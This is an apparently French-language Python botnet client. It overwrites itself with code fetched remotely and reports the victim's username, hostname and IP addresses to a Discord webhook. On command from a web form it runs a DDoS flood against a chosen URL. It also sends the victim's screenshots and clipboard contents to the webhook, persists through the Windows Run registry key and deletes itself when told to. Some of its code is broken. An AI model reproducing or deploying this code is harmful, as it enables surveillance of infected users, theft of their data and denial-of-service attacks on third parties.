import requests
from bs4 import BeautifulSoup
import time
import socket
import hashlib
import re

headers = {
    "User-Agent": "...",
    "Accept": "text/html,application/xhtml+xml",
    "Accept-Language": "fr,en;q=0.9",
    "Connection": "keep-alive",
}

from pathlib import Path

chemin_script = Path(__file__).resolve()
webhook = "https://discordapp.com/api/webhooks/..."

python_url = "https://raw.githubusercontent.com/juto222/Random-Team/main/code.py"
url_version = "https://linganguliguli.worldlite.fr/Formulaire/v.txt"

ancienne_version = "1.0.0"

def script(python_url):
    try:
        r = requests.get(python_url, headers=headers, stream=True)
        r.raise_for_status()
        with open(chemin_script, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        print("Script téléchargé avec succès !")
    except Exception as e:
        print(f"Erreur lors du téléchargement du script : {e}")


def maj_version(nouvelle_version):
    try:
        with open(chemin_script, "r", encoding="utf-8") as f:
            contenu = f.read()

        nouveau_contenu = re.sub(
            r'ancienne_version\s*=\s*"[0-9.]+"',
            f'ancienne_version = "{nouvelle_version}"',
            contenu
        )

        with open(chemin_script, "w", encoding="utf-8") as f:
            f.write(nouveau_contenu)
        print(f"Version mise à jour dans le script : {nouvelle_version}")

    except Exception as e:
        print(f"Erreur lors de la mise à jour de la version : {e}")

while True:
    try:
        r_version = requests.get(url_version, headers=headers)
        r_version.raise_for_status()
        nouvelle_version = r_version.text.strip()

        if nouvelle_version != ancienne_version:
            print(f"Nouvelle version détectée : {nouvelle_version}")
            ancienne_version = nouvelle_version
            script(python_url)
            maj_version(nouvelle_version)
        else:
            print("Aucune nouvelle version.")

    except Exception as e:
        print(f"Erreur lors de la vérification de la version : {e}")

    time.sleep(10)


url = "https://linganguliguli.worldlite.fr/Formulaire/Formulaire.html"

import os

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



valeur = ""
ip_public = ""
alerte_activee = ""
ip_cible = ""
previous_alerte = None
previous_ip = None

import platform
import getpass
import socket

ordi = platform.uname()
hostname = socket.gethostname()



ip_public = requests.get("https://api.ipify.org").text
name = (
    "\n\nMachine démarré \n\n"
    f"Utilisateur actuel : {getpass.getuser()}\n"
    f"Nom de l'ordinateur : {ordi.node}\n"
    f"Adresse IP : {socket.gethostbyname(hostname)}\n"
    f"Adresse IP publique {ip_public}\n\n"
    )

requests.post(webhook, json={"content": name})

def envoyer():
    global valeur

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ = soup.find("input", {"id": "cible"})

        if champ:
            nouvelle_val = champ.get("value").strip()

            # Si la valeur a changé et n'est pas vide → action
            if nouvelle_val != "":
                valeur = nouvelle_val
                requests.post(webhook, json={"content": f"Valeur trouvée : {valeur}"})
                ddos_attack()

    except Exception as e:
        print("Erreur :", e)


def loop_check():
    while True:
        envoyer()
        alerte()
        time.sleep(20)

def alerte():
    global previous_alerte, alerte_activee

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ_alerte = soup.find("input", {"id": "alerte"})
        if champ_alerte:
            message_alerte = champ_alerte.get("value").strip()

            if message_alerte != "" and message_alerte != previous_alerte:
                previous_alerte = message_alerte
                alerte_activee = message_alerte
                ip()
    except soup.Exception as e:
        print("Erreur (alerte) :", e)

    except Exception as e:
        print("Erreur (alerte) :", e)



def ip():
    global ip_public, previous_ip, ip_cible

    try:
        response = requests.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "html.parser")

        champ_ip = soup.find("input", {"id": "ip"})
        if champ_ip:
            ip_cible_nouveau = champ_ip.get("value").strip()

            if ip_cible_nouveau != ip_public:
                requests.post(webhook, json={"content": f"L'ip ne correspond pas à l'IP publique : {ip_public}"})
                return

            confirmer(ip_cible_nouveau)

    except Exception as e:
        print("Erreur (ip) :", e)



def confirmer(ip_cible_nouveau):
    global previous_ip, ip_cible

    if ip_cible_nouveau != "" and ip_cible_nouveau != previous_ip:
        previous_ip = ip_cible_nouveau
        ip_cible = ip_cible_nouveau

        try:
            requests.post(webhook, json={"content": f" Botnet détruit à la demande de l'IP cible : {ip_cible}"})
            destroy()
        except ValueError:
            print("IP cible invalide :", ip_cible)


import os
import sys
import subprocess

def destroy():
    script_path = os.path.abspath(sys.argv[0])

    # Pour Windows
    if os.name == "nt":
        subprocess.Popen(
            f'del "{script_path}"',
            shell=True,
        )
    
    # Pour Linux/Mac
    else:
        subprocess.Popen(["rm", script_path])

    sys.exit()

from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp


async def async_ddos_attack():
    global valeur

    nombre_requetes = int(500)
    concurrence = min(100000, nombre_requetes)  # Limiter à 500 connexions simultanées
    
    start_time = time.time()
    
 
    async def envoyer_requete_async(session, num):
        global valeur 
        try:
            async with session.get(valeur, timeout=5) as response:
                if num % 100 == 0 or num < 10:  
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status}")
                return True
        except Exception as e:
            if num % 100 == 0 or num < 10:
                print(f"Erreur requête {num} : {str(e)}")
            return False
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrence, ssl=False)) as session:
        # Créer les tâches
        tasks = [envoyer_requete_async(session, i+1) for i in range(nombre_requetes)]
        
        batch_size = 1000
        successful = 0
        
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i+batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            successful += sum(1 for r in results if r is True)
            
            # Afficher la progression
            progress = min(100, int((i + len(batch)) / nombre_requetes * 100))
            print(f"Progression : {progress}% ({i + len(batch)}/{nombre_requetes})")
    
    duration = time.time() - start_time
    
    temps = f"\nAttaque terminée en {duration:.2f} secondes"
    cible = f"Requêtes réussies : {successful}/{nombre_requetes}"
    vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
    requests.post(webhook, json=temps)
    requests.post(webhook, json=cible)
    requests.post(webhook, json=vitesse)


def ddos_attack():
    global valeur 

    try:
        asyncio.run(async_ddos_attack())
    except ImportError:
        print("Module aiohttp non trouvé. Utilisation de la méthode plus lente.")

        nombre_requetes = int(500)
        max_workers = min(10000, nombre_requetes)
        
        start_time = time.time()
        success_count = 0
        
        def envoyer_requete(num):
            global valeur 
            try:
                response = requests.get(valeur, timeout=5)
                if num % 50 == 0 or num < 5:
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status_code}")
                return True
            except Exception as e:
                if num % 50 == 0 or num < 5:
                    print(f"Erreur requête {num} : {str(e)}")
                return False
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(envoyer_requete, i+1) for i in range(nombre_requetes)]
            
            for i, future in enumerate(futures):
                try:
                    if future.result():
                        success_count += 1
                except Exception:
                    pass
                
                if (i+1) % 100 == 0:
                    print(f"Progression : {int((i+1)/nombre_requetes*100)}% ({i+1}/{nombre_requetes})")
        
        duration = time.time() - start_time
        
        temps = f"\nAttaque terminée en {duration:.2f} secondes"
        cible = f"Requêtes réussies : {success_count}/{nombre_requetes}"
        vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
        requests.post(webhook, json=temps)
        requests.post(webhook, json=cible)
        requests.post(webhook, json=vitesse)


from PIL import ImageGrab
import io

def screenshot_option_func(webhook):
    while True:
        im = ImageGrab.grab()
        buffer = io.BytesIO()
        im.save(buffer, format="PNG")
        buffer.seek(0)
        files = {'file': ('screenshot.png', buffer, 'image/png')}
        message = "Screenshot envoyé"
        requests.post(webhook, json=message,files=files)
        time.sleep(60)

import clipboard

def clipboard_option_func(webhook):
    old = clipboard.paste()
    while True:
        time.sleep(1)
        mtn = clipboard.paste()
        message = "Presse papier : "
        if old != mtn:
            requests.post(webhook, json={message, mtn})
            im = ImageGrab.grab()
            buffer = io.BytesIO()
            im.save(buffer, format="PNG")
            buffer.seek(0)
            files = {'file': ('screenshot.png', buffer, 'image/png')}
            message = "Screenshot envoyé"
            requests.post(webhook, json=message,files=files)
            old = mtn

import winreg

def autostart_option_func(script_path=None, name="botnet"):
    # Chemin du script Python
    if script_path is None:
        script_path = os.path.abspath(__file__)

    # Chemin vers python.exe utilisé pour lancer ton script
    python_exe = sys.executable

    # Commande complète à lancer au démarrage
    command = f'"{python_exe}" "{script_path}"'

    # On ouvre la clé Run dans le registre
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )

    # On écrit la commande dans la clé
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
    winreg.CloseKey(key)




autostart_option_func()
clipboard_option_func(webhook)
# Appel de la fonction
loop_check()
